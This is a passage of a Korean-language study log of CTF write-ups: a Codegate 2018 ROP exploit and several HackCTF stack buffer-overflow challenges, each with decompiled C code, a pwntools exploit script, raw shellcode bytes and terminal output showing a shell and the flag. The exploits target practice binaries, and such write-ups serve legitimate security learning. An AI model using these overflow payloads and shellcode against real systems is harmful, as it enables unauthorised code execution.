system = libc_base + system_offset
log.info('libc_base : {}'.format(hex(libc_base)))
log.info('system : {}'.format(hex(system)))

p.send("/bin/sh\x00")
p.sendline(p64(system))

p.interactive()

# 이것 저것 확인한다고, 좀 지져분함.
```

```
pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ python exploit.py 
[+] Starting local process './BaskinRobins31': pid 16607
[*] '/home/pocas/pwn/codegate/2018/BaskinRobins31/BaskinRobins31'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] pppr : 0x40087a
[*] bss : 0x602090
[*] read_plt : 0x400700
[*] read_got : 0x602040
[*] write_plt : 0x4006d0
[*] system_offset : 0x4f550
[*] read_offset : 0x110140
[*] libc_base : 0x7f621a53c000
[*] system : 0x7f621a58b550
[*] Switching to interactive mode
\x00$ ls
BaskinRobins31    exploit.py  flag
$ cat flag
flag{The Korean name of "Puss in boots" is "My mom is an alien"}
$  
```

> FLAG : flag{The Korean name of "Puss in boots" is "My mom is an alien"}

---
## PWN D+5 (2021.01.29)<br>

---
HackCTF Challenge : 내 버퍼가 흘러넘친다!!!

<strong>이번에는 BOF 취약점을 이용해서 쉬운 쉘 코드 관련 문제를 하나 풀어보겠습니다.</strong><br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+0h] [ebp-14h]

  setvbuf(stdout, 0, 2, 0);
  printf("Name : ");
  read(0, &name, 0x32u);
  printf("input : ");
  gets(&s);
  return 0;
}
```
<strong>코드를 보면 s 변수를 14h 만큼 생성해주고, read 함수를 이용해서 name을 입력 받고, printf 함수로 출력하고, 또 gets 함수를 이용해서 s를 입력 받는 것을 볼 수 있습니다. 여기서 gets 함수로 입력값을 받고, 입력값의 대한 검증이 없기 때문에 BOF 취약점이 발생합니다. 그래서 그냥 name 변수에 쉘코드를 넣어주고, RET 값으로 name의 주소를 주면 된다.</strong><br>

```
   0x080484f4 <+41>:	push   0x804a060
   0x080484f9 <+46>:	push   0x0
   0x080484fb <+48>:	call   0x8048370 <read@plt>
```
<strong>gdb를 이용해서 name의 주소가 0x804a060라는 것을 알 수 있습니다..</strong><br>

- 시나리오

1. name 변수에 쉘 코드를 입력해준다. 쉘 코드는 그냥 검색해서 구했다.
2. BOF 취약점을 이용해서 RET를 name의 주수로 덮어준다.

```python
from pwn import * 
p = remote("ctf.j0n9hyun.xyz", 3003)

shellcode = "\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"
p.sendafter("Name : ", shellcode)

payload = "A" * 24
payload += p32(0x804a060)
p.sendafter("input : ",payload)
p.interactive()
```

```
pocas@pocas-VirtualBox:~/pwn/HackCTF$ python prob.py 
[+] Opening connection to ctf.j0n9hyun.xyz on port 3003: Done
[*] Switching to interactive mode
$ cat flag
$ cat flag
HackCTF{1_l0v3_70p_pwn3r_m4lhyuk}
$  
```

> FLAG : HackCTF{1_l0v3_70p_pwn3r_m4lhyuk}

---
HackCTF Challenge : x64 Buffer Overflow

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+10h] [rbp-110h]
  int v5; // [rsp+11Ch] [rbp-4h]

  _isoc99_scanf("%s", &s, envp);
  v5 = strlen(&s);
  printf("Hello %s\n", &s);
  return 0;
}
```
<strong>코드를 보면 scanf 함수를 이용해서 s를 입력 받고 있습니다. 하지만 길이에 대한 검증이 없어 BOF 취약점이 발생합니다.</strong><br>

```c
int callMeMaybe()
{
  char *path; // [rsp+0h] [rbp-20h]
  const char *v2; // [rsp+8h] [rbp-18h]
  __int64 v3; // [rsp+10h] [rbp-10h]

  path = "/bin/bash";
  v2 = "-p";
  v3 = 0LL;
  return execve("/bin/bash", &path, 0LL);
}
```
<strong>그리고 다른 함수가 뭐가 있나 보니 callMeMaybe라는 함수가 존재했습니다. 해당 함수를 실행시키면 execve 함수를 이용해서 쉘을 실행 시키는 것을 볼 수 있습니다. 그러니 BOF 취약점을 이용해서 RET를 ccallMeMaybe 함수의 주소로 덮으면 될 거 같습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3004)

shell_addr = 0x400606

payload = "a" * 280
payload += p64(shell_addr)

p.sendline(payload)
p.interactive()
```

```
pocas@pocas-VirtualBox:~/pwn/HackCTF$ python 64bof_basic.py 
[+] Opening connection to ctf.j0n9hyun.xyz on port 3004: Done
[*] Switching to interactive mode
$ cat flag
HackCTF{64b17_b0f_15_51mpl3_700}
$  
```

>FLAG : HackCTF{64b17_b0f_15_51mpl3_700}

---
HackCTF Challenge : x64 Simple_size_BOF

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-6D30h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts(&s);
  printf("buf: %p\n", &v4);
  gets(&v4);
  return 0;
}
```
<strong>코드를 보면 printf 함수를 이용해서 v4의 주소를 출력하고, gets 함수를 이용해서 v4의 값을 입력하고 있는 것을 볼 수 있습니다. 이번 문제도 gets 함수로 입력을 받고, 검증 로직이 없어 BOF 취약점이 발생합니다. 그래서 쉘을 실행시켜주는 함수가 있나 확인해 보니 없었고, ROP를 하려고 보호 기법도 확인해보니 아무 것도 되어 있지 않아 그냥 쉘 코드를 박아주기로 했습니다.</strong><br>


```
pocas@pocas-VirtualBox:~/pwn/HackCTF$ ./Simple_size_bof 
삐빅- 자살방지 문제입니다.
buf: 0x7ffc7b644760

pocas@pocas-VirtualBox:~/pwn/HackCTF$ ./Simple_size_bof 
삐빅- 자살방지 문제입니다.
buf: 0x7ffc99272180

pocas@pocas-VirtualBox:~/pwn/HackCTF$ ./Simple_size_bof 
삐빅- 자살방지 문제입니다.
buf: 0x7fffcba94780

pocas@pocas-VirtualBox:~/pwn/HackCTF$ 
```
<strong>바이너리 파일을 실행해보니 buf의 주소가 계속 바뀌는 것을 알 수 있습니다. 아마 ASLR이 적용되어 있는 거 같습니다. 하지만 그냥 바이너리가 실행되는 동시에 출력되는 buf의 주소를 가져와서 사용하면 됩니다. 마찬가지로 64 비트 쉘 코드도 검색해서 구했습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3005)

shell_code = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.recvline()
buf_addr = int(p.recvline()[5:], 16)
log.info("buf addr : {}".format(hex(buf_addr)))

payload = shell_code
payload += "a" * (27960 - len(shell_code)) # buf + sfp - shell_code_length
payload += p64(buf_addr)

p.send(payload)
p.interactive()
```

```
pocas@pocas-VirtualBox:~/pwn/HackCTF$ python simple_size_bof.py 
[+] Opening connection to ctf.j0n9hyun.xyz on port 3005: Done
[*] buf addr : 0x7fff99022510
[*] Switching to interactive mode
$ cat flag
$ cat flag
HackCTF{s000000_5m4ll_4nd_5m4ll_51z3_b0f}
$  
```

> FLAG : HackCTF{s000000_5m4ll_4nd_5m4ll_51z3_b0f}

---
HackCTF Challenge : Simple_Overflow_ver_2

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // ebx
  char v5; // [esp+13h] [ebp-89h]
  char s[128]; // [esp+14h] [ebp-88h]
  int i; // [esp+94h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0);
  v5 = 121;
  do
  {
    printf("Data : ");
    if ( __isoc99_scanf(" %[^\n]s", s) )
    {
      for ( i = 0; ; ++i )
      {
        v3 = i;
        if ( v3 >= strlen(s) )
          break;
        if ( !(i & 0xF) )
          printf("%p: ", &s[i]);
        printf(" %c", (unsigned __int8)s[i]);
        if ( i % 16 == 15 )
          putchar(10);
      }
    }
    printf("\nAgain (y/n): ");
  }
  while ( __isoc99_scanf(" %c", &v5) && (v5 == 121 || v5 == 89) );
  return 0;
}
```
<strong>코드를 보면 scanf 함수를 이용해서 s의 값을 입력해주고, printf로 입력 값을 출력해주고, `"Again (y/n): "`를 출력해서 한 번 더 입력할 거냐고 묻는다. `y`를 누르면 다시 입력을 하고, `n`을 누르면 종료를 합니다. 하지면 s의 크기는 136인데 입력은 무제한으로 받을 수 있어 BOF 취약점이 발생합니다. 그래서 그냥 이번 문제도 shell code를 s에 넣어주고, ret를 s의 주소로 덮어주면 쉘을 딸 수 있습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3006)

shell_code = "\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"

payload = "a"
p.sendlineafter("Data : ", payload)

buf_addr = int(p.recvline()[0:10], 16)
log.info("buf addr : {}".format(hex(buf_addr)))

p.sendlineafter("Again (y/n): ", "Y")

payload = shell_code
payload += "a" * (140 - len(shell_code)) # buffer + sfp + shellcode_length
payload += p32(buf_addr)

p.sendlineafter("Data : ", payload)
p.interactive()
```

```
pocas@pocas-VirtualBox:~/pwn/HackCTF$ python simple_overflow_ver2.py 
[+] Opening connection to ctf.j0n9hyun.xyz on port 3006: Done
[*] buf addr : 0xffe73ef0
[*] Switching to interactive mode
0xffe73ef0:  1 � \x8d A \x0b\x99 h / s h
Again (y/n): $ cat flag
$ cat  flag
HackCTF{y0u_d1d_7h3_45516nm3n7_5ucc355fully!}
$  
```

> FLAG : HackCTF{y0u_d1d_7h3_45516nm3n7_5ucc355fully!}

---

















